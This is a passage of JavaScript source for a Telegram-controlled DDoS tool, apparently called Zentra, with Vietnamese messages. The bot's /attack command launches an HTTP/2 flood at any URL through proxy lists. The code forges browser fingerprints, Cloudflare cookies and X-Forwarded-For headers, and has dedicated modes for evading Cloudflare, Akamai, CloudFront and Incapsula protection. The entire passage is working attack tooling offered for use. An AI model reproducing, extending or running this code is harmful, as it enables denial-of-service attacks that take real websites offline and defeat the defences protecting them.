        case 'VIETNIX':
            settings.priority = 0;
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 8388608;
            settings.maxFrameSize = 16384;
            settings.maxConcurrentStreams = 100;
            settings.maxHeaderListSize = 4294967295;
            settings.bfmBypass = opts.highbypass || false;
            break;
        case 'Google LLC':
            settings.priority = 0;
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 1048576;
            settings.maxFrameSize = 16384;
            settings.maxConcurrentStreams = Math.random() > 0.5 ? 100 : 150;
            settings.maxHeaderListSize = 137216;
            settings.bfmBypass = opts.highbypass || false;
            break;
        default:
            settings.headerTableSize = 65535;
            settings.maxConcurrentStreams = Math.random() > 0.5 ? 1000 : 2000;
            settings.initialWindowSize = 6291456;
            settings.maxHeaderListSize = 261144;
            settings.maxFrameSize = 16384;
            settings.bfmBypass = opts.highbypass || false;
            break;
    }
    return settings;
}

// ============ GLOBALS ============
const hpack = new AdvancedHPACKSimulator();
const fingerprintGen = new BrowserFingerprintGenerator();
const redirectHandler = new AdvancedRedirectHandler({ maxRedirects: 15 });

// ============ TELEGRAM FUNCTIONS ============
async function sendTelegramMessage(chatId, message) {
    try {
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        });
    } catch (error) {
        console.log('Lỗi gửi tin nhắn:', error.message);
    }
}

// ============ STOP ATTACK ============
function stopAttack(chatId) {
    if (!isAttacking) {
        sendTelegramMessage(chatId, '❌ Không có attack nào đang chạy!');
        return;
    }

    isAttacking = false;
    
    if (attackProcess) {
        try {
            attackProcess.kill();
        } catch (e) {}
        attackProcess = null;
    }

    // Dừng cluster
    if (cluster.isPrimary) {
        for (const id in cluster.workers) {
            try {
                cluster.workers[id].kill();
            } catch (e) {}
        }
    }

    const stats = `
🛑 <b>ĐÃ DỪNG ATTACK</b> 🛑

🎯 <b>Target:</b> ${currentTarget || 'Unknown'}
⏱️ <b>Duration:</b> ${currentDuration || 0}s
📈 <b>Total Requests:</b> ${totalRequests}
📊 <b>Status Codes:</b>
${Object.entries(statusCounts).map(([k, v]) => `  ${k}: ${v}`).join('\n')}
⏳ <b>Uptime:</b> ${startTime ? Math.floor((Date.now() - startTime) / 1000) + 's' : '0s'}
    `;
    
    sendTelegramMessage(chatId, stats);
    
    currentTarget = null;
    currentDuration = 0;
    startTime = null;
    totalRequests = 0;
    statusCounts = {};
}

// ============ START ATTACK COMMAND ============
function startAttackCommand(chatId, url, duration) {
    try {
        new URL(url);
    } catch {
        sendTelegramMessage(chatId, '❌ URL không hợp lệ! Vui lòng nhập URL đúng định dạng.\nVí dụ: https://example.com');
        return;
    }

    const seconds = parseInt(duration);
    if (isNaN(seconds) || seconds < 1 || seconds > 3600) {
        sendTelegramMessage(chatId, '❌ Thời gian không hợp lệ! Vui lòng nhập số giây (1-3600).\nVí dụ: 60');
        return;
    }

    if (isAttacking) {
        sendTelegramMessage(chatId, '⚠️ Đang có attack khác đang chạy! Vui lòng dừng trước khi bắt đầu mới.\nDùng lệnh /stop để dừng.');
        return;
    }

    // Kiểm tra file proxy
    const proxyFile = 'proxy.txt';
    if (!fs.existsSync(proxyFile)) {
        sendTelegramMessage(chatId, `❌ Không tìm thấy file ${proxyFile}! Vui lòng tạo file proxy.`);
        return;
    }

    let proxies = [];
    try {
        proxies = fs.readFileSync(proxyFile, 'utf-8')
            .split('\n')
            .map(line => line.trim())
            .filter(line => line.length > 0 && line.includes(':'));
        
        if (proxies.length === 0) {
            sendTelegramMessage(chatId, `❌ File ${proxyFile} trống hoặc không có proxy hợp lệ!`);
            return;
        }
    } catch (err) {
        sendTelegramMessage(chatId, `❌ Lỗi đọc file proxy: ${err.message}`);
        return;
    }

    isAttacking = true;
    currentTarget = url;
    currentDuration = seconds;
    startTime = Date.now();
    totalRequests = 0;
    statusCounts = {};

    const message = `
🚀 <b>BẮT ĐẦU ATTACK</b> 🚀

🎯 <b>Target:</b> ${url}
⏱️ <b>Duration:</b> ${seconds}s
⚡ <b>Rate:</b> ${FIXED_RATE} req/s
🧵 <b>Threads:</b> ${FIXED_THREADS}
🔄 <b>Proxies:</b> ${proxies.length}
📊 <b>Status:</b> RUNNING

🔹 <b>Started:</b> ${new Date().toLocaleString('vi-VN')}
🔹 <b>Method:</b> HTTP/2 Flood
    `;

    sendTelegramMessage(chatId, message);
    
    // Chạy attack với tham số cố định
    runAttackWithFixedParams(url, seconds, FIXED_THREADS, FIXED_RATE, chatId);
}

// ============ RUN ATTACK WITH FIXED PARAMS ============
function runAttackWithFixedParams(target, duration, threads, rate, chatId) {
    // Tạo file script tạm - FIXED PATH for Termux
    const tempDir = process.env.HOME || '/data/data/com.termux/files/home';
    const tempFile = `${tempDir}/attack_${Date.now()}.js`;
    
    const tempScript = `
const crypto = require('crypto');
const tls = require('tls');
const net = require('net');
const http2 = require('http2');
const fs = require('fs');
const cluster = require('cluster');
const os = require('os');
const socks = require('socks').SocksClient;
const { URL } = require('url');

const TARGET = '${target}';
const DURATION = ${duration};
const THREADS = ${threads};
const RATE = ${rate};

let totalRequests = 0;
let statusCounts = {};
let isRunning = true;
let proxies = [];

try {
    const data = fs.readFileSync('proxy.txt', 'utf-8');
    proxies = data.split('\\n')
        .map(line => line.trim())
        .filter(line => line.length > 0 && line.includes(':'));
} catch (e) {
    console.log('Error reading proxy file');
    process.exit(1);
}

if (proxies.length === 0) {
    console.log('No proxies found');
    process.exit(1);
}

function randomElement(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function randomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function randomString(length) {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    return Array.from(crypto.randomBytes(length)).map(b => chars[b % chars.length]).join('');
}
function randomHex(length) { return crypto.randomBytes(Math.ceil(length/2)).toString('hex').slice(0, length); }

const accept_header = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
];

const cache_header = [
    'max-age=0, no-cache, no-store, must-revalidate, proxy-revalidate, s-maxage=0, private',
    'no-cache, no-store, must-revalidate, max-age=0, private, s-maxage=0',
    'no-cache, no-store, pre-check=0, post-check=0, must-revalidate, proxy-revalidate, s-maxage=0'
];

const language_header = [
    'en-US,en;q=0.9',
    'vi-VN,vi;q=0.9,en-US;q=0.5',
    'fr-CH, fr;q=0.9, en;q=0.8'
];

const fetch_site = ["same-origin", "same-site", "cross-site", "none"];
const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
const fetch_dest = ["document", "sharedworker", "subresource", "unknown", "worker"];
const encoding_header = ['gzip, deflate, br', 'deflate, gzip', 'gzip, identity', 'gzip, compress, br'];

function getRandomCountryCode() {
    const countryCodes = ['US', 'VN', 'JP', 'DE', 'FR', 'GB', 'CN', 'IN', 'BR', 'AU', 'CA', 'RU', 'KR', 'SG'];
    return countryCodes[Math.floor(Math.random() * countryCodes.length)];
}

function generateHeaders() {
    const version = randomInt(127, 131);
    const headers = {
        ':method': Math.random() < 0.9 ? 'GET' : 'POST',
        ':authority': new URL(TARGET).hostname,
        ':scheme': 'https',
        ':path': '/?' + randomString(8) + '=' + randomHex(8) + '&t=' + Date.now(),
        'accept': randomElement(accept_header),
        'sec-fetch-site': randomElement(fetch_site),
        'sec-fetch-mode': randomElement(fetch_mode),
        'sec-fetch-dest': randomElement(fetch_dest),
        'accept-encoding': randomElement(encoding_header),
        'accept-language': randomElement(language_header),
        'cache-control': randomElement(cache_header),
        'cf-ipcountry': getRandomCountryCode(),
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chrome";v="' + version + '", "Not=A?Brand";v="8", "Chromium";v="' + version + '"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'cookie': 'cf_clearance=' + randomHex(32) + '.' + randomHex(16) + '; __cf_bm=' + randomHex(32)
    };
    
    if (Math.random() > 0.5) {
        headers.referer = 'https://www.google.com/';
    }
    
    return headers;
}

function createTLSSocket(socket, hostname) {
    return tls.connect({
        socket,
        ALPNProtocols: ['h2'],
        ciphers: 'ECDHE-RSA-AES128-GCM-SHA256:TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384',
        rejectUnauthorized: false,
        servername: hostname,
        maxVersion: 'TLSv1.3',
        minVersion: 'TLSv1.2'
    });
}

function flood() {
    if (!isRunning || Date.now() >= Date.now() + DURATION * 1000) {
        console.log('Attack completed');
        console.log('Total requests:', totalRequests);
        console.log('Status codes:', JSON.stringify(statusCounts));
        process.exit(0);
    }

    const proxy = randomElement(proxies);
    if (!proxy) { setTimeout(flood, 10); return; }

    const [proxyhost, proxyport] = proxy.split(':');
    const hostname = new URL(TARGET).hostname;

    try {
        const socket = net.connect({ host: proxyhost, port: parseInt(proxyport) }, () => {
            socket.write('CONNECT ' + hostname + ':443 HTTP/1.1\\r\\nHost: ' + hostname + ':443\\r\\nProxy-Connection: Keep-Alive\\r\\n\\r\\n');
        });

        let response = '';
        socket.on('data', (chunk) => {
            response += chunk.toString();
            if (response.includes('\\r\\n\\r\\n')) {
                if (response.includes('200 Connection established')) {
                    const tlsSocket = createTLSSocket(socket, hostname);
                    tlsSocket.on('secureConnect', () => {
                        if (tlsSocket.alpnProtocol !== 'h2') { tlsSocket.destroy(); return; }
                        try {
                            const client = http2.connect(TARGET, { createConnection: () => tlsSocket });
                            const headers = generateHeaders();
                            const req = client.request(headers, { endStream: headers[':method'] === 'GET' });
                            req.on('response', (res) => {
                                const status = res[':status'];
                                statusCounts[status] = (statusCounts[status] || 0) + 1;
                                totalRequests++;
                            });
                            req.on('error', () => {});
                            req.on('end', () => {});
                            if (headers[':method'] === 'POST') { req.write(randomString(10)); req.end(); }
                            setTimeout(() => {
                                try { client.close(); tlsSocket.destroy(); socket.destroy(); } catch(e) {}
                            }, 100);
                        } catch(e) { tlsSocket.destroy(); socket.destroy(); }
                    });
                    tlsSocket.on('error', () => { socket.destroy(); });
                } else { socket.destroy(); }
                socket.removeAllListeners('data');
            }
        });
        socket.on('error', () => { socket.destroy(); });
        socket.setTimeout(3000, () => { socket.destroy(); });
    } catch(e) {}

    setTimeout(flood, Math.max(1, 1000 / RATE));
}

console.log('🚀 Starting attack on', TARGET);
console.log('⏱️ Duration:', DURATION, 'seconds');
console.log('🧵 Threads:', THREADS);
console.log('⚡ Rate:', RATE, 'req/s');
console.log('🔄 Proxies loaded:', proxies.length);

for (let i = 0; i < THREADS; i++) { setTimeout(flood, i * 10); }

setTimeout(() => {
    isRunning = false;
    console.log('✅ Attack completed');
    console.log('Total requests:', totalRequests);
    console.log('Status codes:', JSON.stringify(statusCounts));
    process.exit(0);
}, DURATION * 1000);

process.on('SIGINT', () => {
    isRunning = false;
    console.log('\\n🛑 Attack stopped');
    console.log('Total requests:', totalRequests);
    console.log('Status codes:', JSON.stringify(statusCounts));
    process.exit(0);
});
`;

    fs.writeFileSync(tempFile, tempScript);

    const { spawn } = require('child_process');
    attackProcess = spawn('node', [tempFile], {
        cwd: process.cwd()
    });

    attackProcess.stdout.on('data', (data) => {
        const output = data.toString();
        console.log('Attack output:', output);
        const matchTotal = output.match(/Total requests:\s*(\d+)/);
        if (matchTotal) totalRequests = parseInt(matchTotal[1]);
        const matchStatus = output.match(/Status codes:\s*({.*})/);
        if (matchStatus) {
            try { statusCounts = JSON.parse(matchStatus[1].replace(/'/g, '"')); } catch(e) {}
        }
    });

    attackProcess.stderr.on('data', (data) => {
        console.error('Attack error:', data.toString());
    });

    attackProcess.on('close', (code) => {
        if (isAttacking) {
            isAttacking = false;
            const stats = `
✅ <b>ATTACK HOÀN THÀNH</b> ✅

🎯 <b>Target:</b> ${target}
⏱️ <b>Duration:</b> ${duration}s
📈 <b>Total Requests:</b> ${totalRequests}
📊 <b>Status Codes:</b>
${Object.entries(statusCounts).map(([k, v]) => `  ${k}: ${v}`).join('\n')}
⏳ <b>Uptime:</b> ${Math.floor((Date.now() - startTime) / 1000)}s
            `;
            sendTelegramMessage(chatId, stats);
        }
        try { fs.unlinkSync(tempFile); } catch(e) {}
    });
}

// ============ TELEGRAM COMMAND HANDLER ============
async function handleTelegramCommand(chatId, text) {
    const parts = text.split(' ');
    const command = parts[0].toLowerCase();

    switch (command) {
        case '/start':
            sendTelegramMessage(chatId, `
🤖 <b>ZENTRA BOT - DDOS TOOL</b> 🤖

<b>📋 LỆNH CÓ SẴN:</b>
/attack <URL> <giây> - Bắt đầu tấn công
/stop - Dừng attack đang chạy
/help - Hướng dẫn chi tiết
/start - Hiển thị menu chính

<b>⚙️ CẤU HÌNH CỐ ĐỊNH:</b>
- Threads: ${FIXED_THREADS}
- Rate: ${FIXED_RATE} req/s
- Proxy: Tự động lấy từ proxy.txt

<b>📝 VÍ DỤ:</b>
/attack https://example.com 60

<b>🔗 LIÊN HỆ:</b>
📱 Telegram: https://t.me/+Dy2X0W-jvmQ1MGQ1
            `);
            break;

        case '/attack':
            const url = parts[1];
            const duration = parts[2];
            if (!url || !duration) {
                sendTelegramMessage(chatId, `
⚠️ <b>CÁCH SỬ DỤNG:</b>
/attack <URL> <giây>

<b>VÍ DỤ:</b>
/attack https://example.com 60

<b>THÔNG SỐ CỐ ĐỊNH:</b>
- Threads: ${FIXED_THREADS}
- Rate: ${FIXED_RATE} req/s
- Duration: 1-3600 giây
                `);
                return;
            }
            startAttackCommand(chatId, url, duration);
            break;

        case '/stop':
            stopAttack(chatId);
            break;

        case '/help':
            sendTelegramMessage(chatId, `
🤖 <b>ZENTRA BOT - HƯỚNG DẪN</b> 🤖

<b>📋 LỆNH:</b>
/attack <URL> <giây> - Bắt đầu tấn công
/stop - Dừng attack đang chạy
/help - Hiển thị hướng dẫn
/start - Hiển thị menu chính

<b>⚙️ THÔNG SỐ CỐ ĐỊNH:</b>
- Threads: ${FIXED_THREADS}
- Rate: ${FIXED_RATE} req/s
- Proxy: Tự động lấy từ proxy.txt

<b>📝 VÍ DỤ:</b>
/attack https://example.com 60
/stop

<b>🔗 LIÊN HỆ:</b>
📱 Telegram: https://t.me/+Dy2X0W-jvmQ1MGQ1
            `);
            break;

        default:
            sendTelegramMessage(chatId, `
❌ Lệnh không hợp lệ!

📋 <b>LỆNH CÓ SẴN:</b>
/attack <URL> <giây> - Tấn công
/stop - Dừng attack
/help - Hướng dẫn
/start - Menu chính

📝 <b>VÍ DỤ:</b>
/attack https://example.com 60
            `);
            break;
    }
}

// ============ TELEGRAM BOT POLLING ============
async function startTelegramBot() {
    console.log('🤖 Telegram Bot đang khởi động...');
    console.log('📱 Bot ID: @' + TELEGRAM_TOKEN.split(':')[0]);
    console.log('👤 Admin ID: ' + ADMIN_ID);
    console.log('');
    console.log('⚙️ CẤU HÌNH CỐ ĐỊNH:');
    console.log('   Threads: ' + FIXED_THREADS);
    console.log('   Rate: ' + FIXED_RATE + ' req/s');
    console.log('   Proxy File: proxy.txt');
    console.log('');
    
    sendTelegramMessage(ADMIN_ID, `
🤖 <b>ZENTRA BOT ĐÃ SẴN SÀNG</b> 🤖

✅ Bot đã online!
📅 ${new Date().toLocaleString('vi-VN')}

<b>📋 LỆNH:</b>
/attack <URL> <giây> - Tấn công
/stop - Dừng attack
/help - Hướng dẫn
/start - Menu chính

<b>⚙️ THÔNG SỐ CỐ ĐỊNH:</b>
- Threads: ${FIXED_THREADS}
- Rate: ${FIXED_RATE} req/s
    `);

    while (isBotRunning) {
        try {
            const response = await axios.get(`${TELEGRAM_API}/getUpdates`, {
                params: {
                    offset: lastUpdateId + 1,
                    timeout: 30
                }
            });

            const updates = response.data.result;
            
            for (const update of updates) {
                lastUpdateId = update.update_id;
                
                if (update.message && update.message.text) {
                    const chatId = update.message.chat.id.toString();
                    const text = update.message.text;
                    const username = update.message.from.username || 'unknown';
                    
                    console.log(`📩 Nhận lệnh từ @${username}: ${text}`);
                    await handleTelegramCommand(chatId, text);
                }
            }

            await new Promise(resolve => setTimeout(resolve, 1000));
            
        } catch (error) {
            console.log('Lỗi Telegram bot:', error.message);
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }
}

// ============ PHẦN START CHÍNH ============
const [,, host, time, rate, thread, proxyfile, ...args] = process.argv;

// Nếu KHÔNG có tham số → chạy Telegram Bot
if (process.argv.length <= 2) {
    startTelegramBot();
} else {
    // CÓ tham số → chạy chế độ DDoS (bỏ qua Telegram)
    const options = {
        useAll: args.includes('--all'),
        randpath: args.includes('--randpath') || args.includes('--all'),
        highbypass: args.includes('--bypass') || args.includes('--all'),
        cachebypass: args.includes('--cache') || args.includes('--all'),
        fullheaders: args.includes('--full') || args.includes('--all'),
        extraheaders: args.includes('--extra') || args.includes('--all'),
        queryopt: args.includes('--query') || args.includes('--all'),
        fingerprintopt: args.includes('--fingerprint') || args.includes('--all'),
        ratelimitopt: args.includes('--ratelimit') || args.includes('--all'),
        redirect: args.includes('--redirect') || args.includes('--all'),
        npath: args.includes('--npath') || args.includes('--all'),
        backend: args.includes('--backend') || args.includes('--all'),
        proxytype: args.includes('--type') && args[args.indexOf('--type') + 1] ? args[args.indexOf('--type') + 1] : 'http',
        info: args.includes('--info')
    };

    if (options.useAll) {
        options.randpath = !args.includes('--all-randpath') && options.randpath;
        options.highbypass = !args.includes('--all-bypass') && options.highbypass;
        options.cachebypass = !args.includes('--all-cache') && options.cachebypass;
        options.fullheaders = !args.includes('--all-full') && options.fullheaders;
        options.extraheaders = !args.includes('--all-extra') && options.extraheaders;
        options.queryopt = !args.includes('--all-query') && options.queryopt;
        options.fingerprintopt = !args.includes('--all-fingerprint') && options.fingerprintopt;
        options.ratelimitopt = !args.includes('--all-ratelimit') && options.ratelimitopt;
        options.redirect = !args.includes('--all-redirect') && options.redirect;
        options.npath = !args.includes('--all-npath') && options.npath;
        options.backend = !args.includes('--all-backend') && options.backend;
    }

    if (!host || !time || !rate || !thread || !proxyfile || !['http', 'socks4', 'socks5'].includes(options.proxytype.toLowerCase())) {
        console.log(`node zentra.js host time rate thread proxy.txt [options]`);
        console.log(`Options:`);
        console.log(`--randpath: Randomize request paths`);
        console.log(`--bypass: Enable advanced anti-bot bypass`);
        console.log(`--cache: Bypass cache with random queries`);
        console.log(`--full: Include full browser headers`);
        console.log(`--extra: Add extra evasion headers`);
        console.log(`--query: Optimize queries with random parameters`);
        console.log(`--fingerprint: Enable TLS and browser fingerprinting`);
        console.log(`--ratelimit: Handle rate limiting dynamically`);
        console.log(`--redirect: Enable handling of 301, 302, 307 redirects`);
        console.log(`--npath: Attack raw URL without additional paths`);
        console.log(`--backend: Enable advanced backend bypass for major providers`);
        console.log(`--all: Enable all options`);
        console.log(`--all-<option>: Disable specific option when using --all`);
        console.log(`--type <http/socks4/socks5>: Specify proxy type`);
        console.log(`--info: Display attack configuration`);
        process.exit(1);
    }

    let proxies = [];
    try {
        if (!fs.existsSync(proxyfile)) {
            console.error(`Proxy file ${proxyfile} does not exist`);
            process.exit(1);
        }
        proxies = fs.readFileSync(proxyfile, 'utf-8')
            .split('\n')
            .map(line => line.trim())
            .filter(line => line.length > 0 && line.includes(':'));
        if (proxies.length === 0) {
            console.error(`Proxy file ${proxyfile} is empty or contains no valid proxies`);
            process.exit(1);
        }
    } catch (err) {
        console.error(`Error reading proxy file ${proxyfile}:`, err.message);
        process.exit(1);
    }

    const connectionPool = new Map();
    const MAX_CONNECTIONS_PER_WORKER = 10;
    const MAX_RAM_PERCENTAGE = 80;
    const RESTART_DELAY = 1000;

    // ============ HELPERS ============
    function randomInt(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    function randomElement(arr) {
        return arr[Math.floor(Math.random() * arr.length)] || arr[0] || null;
    }

    function random_string(length, chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") {
        return Array.from(crypto.randomBytes(length))
            .map(b => chars[b % chars.length])
            .join('');
    }

    function randomBase64(length) {
        return Buffer.from(crypto.randomBytes(Math.ceil(length * 3 / 4)))
            .toString('base64')
            .replace(/=/g, '')
            .slice(0, length);
    }

    function randomHex(length) {
        return crypto.randomBytes(Math.ceil(length / 2))
            .toString('hex')
            .slice(0, length);
    }

    function generateAdvancedPath(hostname) {
        if (options.npath) {
            return '/';
        }
        let path = host.replace('%RAND%', random_string(randomInt(3, 8)));
        if (!options.randpath) {
            return new URL(path).pathname || '/';
        }
        const basePaths = ['/', '/api', '/login', '/search', '/home', '/dashboard'];
        path = `${randomElement(basePaths)}/${random_string(randomInt(3, 8))}`;
        if (options.cachebypass || options.queryopt) {
            const params = [];
            params.push(`cb=${randomHex(8)}`);
            params.push(`ts=${Date.now()}`);
            params.push(`r=${random_string(6)}`);
            path += `?${params.join('&')}`;
        }
        return path;
    }

    function fixJA3Fingerprint() {
        const ja3 = "769,49195,0-4-5-6-10-11-14-15-16-18-23-29-33-36-39-51-53,0-1-2-4,0";
        return crypto.createHash('md5').update(ja3).digest('hex');
    }

    function generateBaseHeaders(proxy, hostname, fingerprint, sessionId) {
        const version = randomInt(127, 131);
        const fullVersion = `${version}.0.${randomInt(6610, 6790)}.${randomInt(10, 100)}`;
        const isChrome = fingerprint.browser === 'Chrome';
        const isFirefox = fingerprint.browser === 'Firefox';
        const baseHeaders = {
            ':method': Math.random() < 0.9 ? 'GET' : 'POST',
            ':authority': hostname,
            ':scheme': 'https',
            ':path': generateAdvancedPath(hostname),
            'accept': randomElement(accept_header),
            'sec-fetch-site': randomElement(fetch_site),
            'sec-fetch-mode': randomElement(fetch_mode),
            'sec-fetch-dest': randomElement(fetch_dest),
            'accept-encoding': randomElement(encoding_header),
            'accept-language': randomElement(language_header),
            'cache-control': randomElement(cache_header),
            'cf-ipcountry': redirectHandler.getRandomCountryCode(),
            'x-cloudflare-bot-score': Math.floor(Math.random() * 100).toString()
        };
        if (options.cachebypass) {
            Object.assign(baseHeaders, {
                'cache-control': 'no-cache, no-store, must-revalidate',
                'pragma': 'no-cache',
                'if-modified-since': new Date(Date.now() - 86400000).toUTCString()
            });
        }
        if (isChrome) {
            Object.assign(baseHeaders, {
                'sec-ch-ua': `"${fingerprint.browser}";v="${version}", "Not=A?Brand";v="8", "Chromium";v="${version}"`,
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': `"${fingerprint.platform}"`,
                'sec-ch-ua-platform-version': fingerprint.platform === 'Windows' ? '"10.0.0"' : '"14.5.0"',
                'user-agent': fingerprint.ua
            });
        } else if (isFirefox) {
            Object.assign(baseHeaders, {
                'user-agent': fingerprint.ua,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'accept-language': 'vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3',
                'accept-encoding': 'gzip, deflate, br',
                'dnt': '1',
                'upgrade-insecure-requests': '1',
                'te': 'trailers'
            });
        }
        if (options.fullheaders) {
            Object.assign(baseHeaders, {
                'sec-ch-ua-arch': fingerprint.platform.includes('Windows') || fingerprint.platform.includes('Linux') ? '"x86"' : '"arm"',
                'sec-ch-ua-bitness': '"64"',
                'sec-ch-ua-full-version': `"${fullVersion}"`
            });
        }
        if (options.highbypass) {
            const cookies = fingerprintGen.generateAdvancedCookies(hostname, sessionId);
            Object.assign(baseHeaders, {
                'cookie': cookies,
                'x-requested-with': 'XMLHttpRequest',
                'x-forwarded-for': `${randomInt(1, 255)}.${randomInt(1, 255)}.${randomInt(1, 255)}.${randomInt(1, 254)}`,
                'x-real-ip': proxy.split(':')[0]
            });
        }
        if (options.extraheaders) {
            Object.assign(baseHeaders, {
                'x-forwarded-proto': 'https',
                'x-forwarded-scheme': 'https',
                'x-forwarded-host': hostname,
                'x-request-id': crypto.randomUUID()
            });
        }
        if (options.fingerprintopt) {
            Object.assign(baseHeaders, {
                'x-tls-fingerprint': fixJA3Fingerprint(),
                'x-canvas-fingerprint': fingerprint.canvas,
                'x-webgl-fingerprint': fingerprint.webgl,
                'x-audio-fingerprint': fingerprint.audio,
                'x-timezone': fingerprint.timezone,
                'x-viewport': fingerprint.viewport
            });
        }
        if (Math.random() > 0.3) {
            const referers = [
                'https://www.google.com/',
                'https://www.facebook.com/',
                'https://www.youtube.com/',
                `https://${hostname}/`
            ];
            baseHeaders.referer = randomElement(referers);
        }
        if (baseHeaders[':method'] === 'POST') {
            const postData = random_string(randomInt(10, 50));
            Object.assign(baseHeaders, {
                'content-length': Buffer.from(postData, 'utf-8').length,
                'content-type': 'application/x-www-form-urlencoded'
            });
        }
        return baseHeaders;
    }

    function generateAdvancedHeaders(proxy, hostname, fingerprint, sessionId, baseHeaders) {
        let headers = { ...baseHeaders };
        if (options.backend) {
            const entropy = crypto.randomBytes(16).toString('hex');
            const timestamp = Date.now();
            headers['x-h2-priority'] = `u=${Math.floor(Math.random() * 8)},i`;
            headers['x-h2-stream-latency'] = Math.floor(Math.random() * 20 + 5).toString();
            headers['x-session-continuity'] = `${entropy.substring(0, 10)}-${timestamp % 10000}`;
            headers['x-session-flow-id'] = Math.floor(Math.random() * 1000000).toString();
            headers['x-tls-handshake-id'] = crypto.randomBytes(24).toString('hex');
            headers['x-protocol-behavior'] = Buffer.from(`${sessionId}:${timestamp}`).toString('base64').substring(0, 20);
            headers['x-browser-metrics'] = JSON.stringify({
                cpuCores: [4, 8, 12][Math.floor(Math.random() * 3)],
                memoryAvailable: Math.floor(Math.random() * 60000000 + 20000000),
                domLoadTime: Math.floor(Math.random() * 300 + 100)
            });
            const targetAnalysis = {
                isCloudflare: hostname.includes('cloudflare') || Math.random() > 0.6,
                isAkamai: hostname.includes('akamai') || Math.random() > 0.7,
                isCloudFront: hostname.includes('cloudfront') || Math.random() > 0.8,
                isIncapsula: hostname.includes('incapsula') || Math.random() > 0.85
            };
            if (targetAnalysis.isCloudflare) {
                headers['x-cf-session-token'] = `${entropy.substring(0, 6)}-${timestamp.toString(16)}`;
                headers['x-cf-edge-delay'] = Math.floor(Math.random() * 15 + 3).toString();
                headers['x-cf-network-asn'] = `AS${Math.floor(Math.random() * 60000 + 1000)}`;
                headers['x-cf-client-context'] = JSON.stringify({
                    region: 'Hanoi',
                    timezone: 'Asia/Ho_Chi_Minh',
                    networkType: ['fiber', '5g'][Math.floor(Math.random() * 2)]
                });
            }
            if (targetAnalysis.isAkamai) {
                headers['x-akamai-flow-id'] = entropy.substring(0, 20);
                headers['x-akamai-region-token'] = `reg:${Math.random().toString(36).substring(2, 10)}`;
                headers['x-akamai-bandwidth'] = `${Math.floor(Math.random() * 80 + 30)}Mbps`;
                headers['x-akamai-device-hint'] = JSON.stringify({
                    deviceMemory: [8, 16][Math.floor(Math.random() * 2)],
                    lowDataMode: Math.random() > 0.9
                });
            }
            if (targetAnalysis.isCloudFront) {
                headers['x-aws-flow-id'] = `flow-${entropy.substring(0, 8)}`;
                headers['x-aws-edge-latency'] = Math.floor(Math.random() * 25 + 8).toString();
                headers['x-aws-client-type'] = ['desktop', 'mobile'][Math.floor(Math.random() * 2)];
            }
            if (targetAnalysis.isIncapsula) {
                headers['x-inc-flow-token'] = entropy.substring(0, 18);
                headers['x-inc-interaction-id'] = `int:${Math.floor(Math.random() * 500)}`;
                headers['x-inc-session-context'] = JSON.stringify({
                    navigationCount: Math.floor(Math.random() * 8 + 1),
                    pageRenderTime: Math.floor(Math.random() * 800 + 150)
                });
            }
            headers['x-forwarded-for'] = `${randomInt(1, 223)}.${randomInt(1, 255)}.${randomInt(1, 255)}.${randomInt(1, 254)}`;
            headers['x-real-ip'] = `${randomInt(1, 223)}.${randomInt(1, 255)}.${randomInt(1, 255)}.${randomInt(1, 254)}`;
        }
        return headers;
    }

    function createAdvancedTLSSocket(socket, hostname) {
        return tls.connect({
            socket,
            ALPNProtocols: ['h2'],
            ciphers: randomElement(cplist),
            sigalgs: SignalsList,
            ecdhCurve: ecdhCurve,
            secureContext: secureContext,
            honorCipherOrder: true,
            rejectUnauthorized: false,
            servername: hostname,
            maxVersion: 'TLSv1.3',
            minVersion: 'TLSv1.2',
            requestOCSP: true
        });
    }

    // ============ FLOOD CORE ============
    async function flood(endTime, retryCount = 0) {
        if (retryCount > 3) return;
        let proxy, proxyhost, proxyport, proxyuser, proxypass, proxyStr;
        try {
            proxy = randomElement(proxies);
            if (!proxy) return;
            proxy = proxy.split(':');
            if (!proxy[0] || !proxy[1]) return;
            proxyhost = proxy[0];
            proxyport = parseInt(proxy[1]);
            proxyuser = proxy.length > 2 ? proxy[2] : null;
            proxypass = proxy.length > 3 ? proxy[3] : null;
            proxyStr = `${proxyhost}:${proxyport}`;
        } catch {
            setTimeout(() => flood(endTime, retryCount + 1), 500);
            return;
        }
        const hostname = new URL(host).hostname;
        const fingerprint = fingerprintGen.getRandomFingerprint();
        const sessionId = randomHex(16);
        let socket;
        const connectOptions = {
            host: hostname,
            port: 443,
            timeout: 5000
        };
        const createConnection = (callback) => {
            try {
                if (options.proxytype.toLowerCase() === 'http') {
                    socket = net.connect({ host: proxyhost, port: proxyport }, () => {
                        const connectReq =
                            `CONNECT ${hostname}:443 HTTP/1.1\r\n` +
                            `Host: ${hostname}:443\r\n` +
                            `User-Agent: ${fingerprint.ua}\r\n` +
                            `Proxy-Connection: Keep-Alive\r\n` +
